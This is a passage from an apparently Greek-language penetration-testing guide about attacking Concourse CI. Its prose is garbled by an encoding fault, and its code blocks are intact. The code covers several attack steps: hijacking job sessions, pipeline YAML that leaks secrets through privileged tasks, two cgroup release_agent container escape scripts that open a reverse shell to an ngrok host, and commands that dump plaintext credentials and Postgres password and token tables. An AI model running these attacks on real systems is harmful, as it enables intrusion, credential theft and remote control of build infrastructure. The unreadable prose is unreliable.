Î£Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± ÎµÎ¯Î´Î±Î¼Îµ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€Î¬ÏÎµÏ„Îµ ÏŒÎ»Î± Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± ÎºÎ±Î¹ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï„Ï‰Î½ Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ pipeline. ÎŸÎ¹ **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Ï‰Î½ **Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î±ÏÎ³ÏŒÏ„ÎµÏÎ± Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï„Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ**.

#### Session inside running or recently run container

Î‘Î½ Î­Ï‡ÎµÏ„Îµ Î±ÏÎºÎµÏ„Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± (**ÏÏŒÎ»Î¿Ï‚ Î¼Î­Î»Î¿Ï…Ï‚ Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ±**) Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ pipelines ÎºÎ±Î¹ ÏÏŒÎ»Î¿Ï…Ï‚** ÎºÎ±Î¹ Î±Ï€Î»Î¬ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± **ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Î¼Î­ÏƒÎ±** ÏƒÏ„Î¿ `<pipeline>/<job>` **Î´Î¿Ï‡ÎµÎ¯Î¿** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î±:

* **ÎšÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **container**
* Î ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **Î´Î¹Î±Ï†ÏÎ³ÎµÏ„Îµ** ÏƒÏ„Î· Î¼Î¿Î½Î¬Î´Î±
* Î‘ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ/ÎšÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ **cloud metadata** endpoint (Î±Ï€ÏŒ Ï„Î¿ pod ÎºÎ±Î¹ Î±Ï€ÏŒ Ï„Î· Î¼Î¿Î½Î¬Î´Î±, Î±Î½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½)

#### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±/Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Pipeline

Î‘Î½ Î­Ï‡ÎµÏ„Îµ Î±ÏÎºÎµÏ„Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± (**ÏÏŒÎ»Î¿Ï‚ Î¼Î­Î»Î¿Ï…Ï‚ Î® Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ±**) Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ/Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î½Î­Î± pipelines.** Î•Î»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
ÎœÎµ Ï„Î·Î½ **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ·/Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±** ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… pipeline Î¸Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î±:

* **ÎšÎ»Î­ÏˆÎµÏ„Îµ** Ï„Î± **Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** (Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ ÎµÎºÏ„ÏÏ€Ï‰ÏƒÎ®Ï‚ Ï„Î¿Ï…Ï‚ Î® Î¼Ï€Î±Î¯Î½Î¿Î½Ï„Î±Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ `env`)
* **Î”ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ** ÏƒÏ„Î· **Î¼Î¿Î½Î¬Î´Î±** (Î´Î¯Î½Î¿Î½Ï„Î¬Ï‚ ÏƒÎ±Ï‚ Î±ÏÎºÎµÏ„Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± - `privileged: true`)
* Î‘ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ/ÎšÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ **cloud metadata** endpoint (Î±Ï€ÏŒ Ï„Î¿ pod ÎºÎ±Î¹ Î±Ï€ÏŒ Ï„Î· Î¼Î¿Î½Î¬Î´Î±)
* **Î”Î¹Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ** Ï„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î­Î½ pipeline

#### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î·Ï‚ Î•ÏÎ³Î±ÏƒÎ¯Î±Ï‚

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Î¼Î­Î¸Î¿Î´Î¿ Î±Î»Î»Î¬ Î±Î½Ï„Î¯ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ/Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Î½Î­Î¿ pipeline Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î±Ï€Î»ÏÏ‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÏÎ³Î±ÏƒÎ¯Î±** (Î· Î¿Ï€Î¿Î¯Î± Ï€Î¹Î¸Î±Î½ÏÏ‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï€Î¹Î¿ **Î±ÏŒÏÎ±Ï„Î·**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### Escaping to the node from privileged task

Î£Ï„Î¹Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ ÎµÎ½ÏŒÏ„Î·Ï„ÎµÏ‚ ÎµÎ¯Î´Î±Î¼Îµ Ï€ÏÏ‚ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Î¼Î¹Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ® ÎµÏÎ³Î±ÏƒÎ¯Î± Î¼Îµ Ï„Î¿ concourse**. Î‘Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± Î´ÏÏƒÎµÎ¹ ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î±ÎºÏÎ¹Î²ÏÏ‚ Ï„Î·Î½ Î¯Î´Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Î· Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ® ÏƒÎ·Î¼Î±Î¯Î± ÏƒÎµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ docker. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î´ÎµÎ½ Î¸Î± Î´ÎµÎ¯Ï„Îµ Ï„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… ÏƒÏ„Î¿ /dev, Î¿Ï€ÏŒÏ„Îµ Î· Î´Î¹Î±Ï†Ï…Î³Î® Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ "Ï€Î¿Î»ÏÏ€Î»Î¿ÎºÎ·".

Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ PoC Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ release\_agent Î³Î¹Î± Î½Î± Î´Î¹Î±Ï†ÏÎ³Î¿Ï…Î¼Îµ Î¼Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î¼Î¹ÎºÏÎ­Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÎ¹, Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Î¹Î± [**ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Î±Ï€ÎµÎ»ÎµÏ…Î¸Î­ÏÏ‰ÏƒÎ·\_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) Î±Ï€Î»Î¬ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ ÏƒÏ„Î¿ node
{% endhint %}

#### Î‘Ï€ÎµÎ»ÎµÏ…Î¸Î­ÏÏ‰ÏƒÎ· ÏƒÏ„Î¿ node Î±Ï€ÏŒ Î­Î½Î± Worker container

ÎœÎ¹Î± ÎºÎ±Î½Î¿Î½Î¹ÎºÎ® Î±Ï€ÎµÎ»ÎµÏ…Î¸Î­ÏÏ‰ÏƒÎ·\_agent escape Î¼Îµ Î¼Î¹Î± Î¼Î¹ÎºÏÎ® Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î® Î³Î¹Î± Î±Ï…Ï„ÏŒ:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Escaping to the node from the Web container

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Ï„Î¿ web container Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î¬Î¼Ï…Î½ÎµÏ‚ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚, **Î´ÎµÎ½ Ï„ÏÎ­Ï‡ÎµÎ¹ Ï‰Ï‚ ÎºÎ¿Î¹Î½ÏŒ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏŒ container** (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, **Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ** Î½Î± **mount** ÎºÎ±Î¹ Î¿Î¹ **Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„ÎµÏ‚** ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚**, Î¿Ï€ÏŒÏ„Îµ ÏŒÎ»Î¿Î¹ Î¿Î¹ ÎµÏÎºÎ¿Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Î¾ÎµÏ†ÏÎ³ÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ container ÎµÎ¯Î½Î±Î¹ Î¬Ï‡ÏÎ·ÏƒÏ„Î¿Î¹).

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ **Ï„Î¿Ï€Î¹ÎºÎ¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î³Î¹Î± Î½Î± **ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¹ÏƒÏ„Î¿Ï** ÎºÎ±Î¹ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏŒ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Ï†ÏÎ³ÎµÏ„Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿**.

Î£Ï„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± **Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· postgresql** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ concourse (Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·**, **ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** ÎºÎ±Î¹ Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼ÎµÏ„Î±Î¾Ï Î¬Î»Î»Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Garden - ÎŒÏ‡Î¹ Î¼Î¹Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Î•Ï€Î¯Î¸ÎµÏƒÎ·

{% hint style="warning" %}
Î‘Ï…Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±, Î±Î»Î»Î¬ ÎµÏ€ÎµÎ¹Î´Î® Î±ÎºÎ¿ÏÎµÎ¹ Î¼ÏŒÎ½Î¿ ÏƒÎµ localhost, Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ Î´ÎµÎ½ Î¸Î± Î­Ï‡Î¿Ï…Î½ ÎºÎ±Î¼Î¯Î± ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î¼Îµ Î®Î´Î· ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï€ÏÎ¹Î½.
{% endhint %}

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, ÎºÎ¬Î¸Îµ concourse worker Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î¼Î¹Î± [**Garden**](https://github.com/cloudfoundry/garden) Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÏƒÏ„Î· Î¸ÏÏÎ± 7777. Î‘Ï…Ï„Î® Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Web master Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ ÏƒÏ„Î¿Î½ worker **Ï„Î¹ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** (Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î± ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Î¸Îµ ÎµÏÎ³Î±ÏƒÎ¯Î±). Î‘Ï…Ï„ÏŒ Î±ÎºÎ¿ÏÎ³ÎµÏ„Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÎºÎ±Î»ÏŒ Î³Î¹Î± Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿, Î±Î»Î»Î¬ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎºÎ±Î»Î­Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚:

* Î•Î¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ **ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½Î¿ Ï„Î¿Ï€Î¹ÎºÎ¬** (127..0.0.1) ÎºÎ±Î¹ Î½Î¿Î¼Î¯Î¶Ï‰ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î¿ worker Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€Î­Î½Î±Î½Ï„Î¹ ÏƒÏ„Î¿Î½ Web Î¼Îµ Ï„Î·Î½ ÎµÎ¹Î´Î¹ÎºÎ® Ï…Ï€Î·ÏÎµÏƒÎ¯Î± SSH, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± ÏƒÎ®ÏÎ±Î³Î³Î± ÏÏƒÏ„Îµ Î¿ web server Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î¼Î¹Î»Î®ÏƒÎµÎ¹ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Garden** Î¼Î­ÏƒÎ± ÏƒÎµ ÎºÎ¬Î¸Îµ worker.
* ÎŸ web server **Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÎºÎ¬Î¸Îµ Î»Î¯Î³Î± Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î±**, ÎºÎ±Î¹ Ï„Î± **Î±Î½Î±Ï€Î¬Î½Ï„ÎµÏ‡Î±** ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ **Î´Î¹Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Î¹**. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± **Ï„ÏÎ­Î¾ÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ**, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Ï€Î±ÏÎ­Î¼Î²ÎµÏ„Îµ** ÏƒÏ„Î·Î½ **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±** Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… web server ÎºÎ±Î¹ Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ garden.

ÎŸÎ¹ concourse workers ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
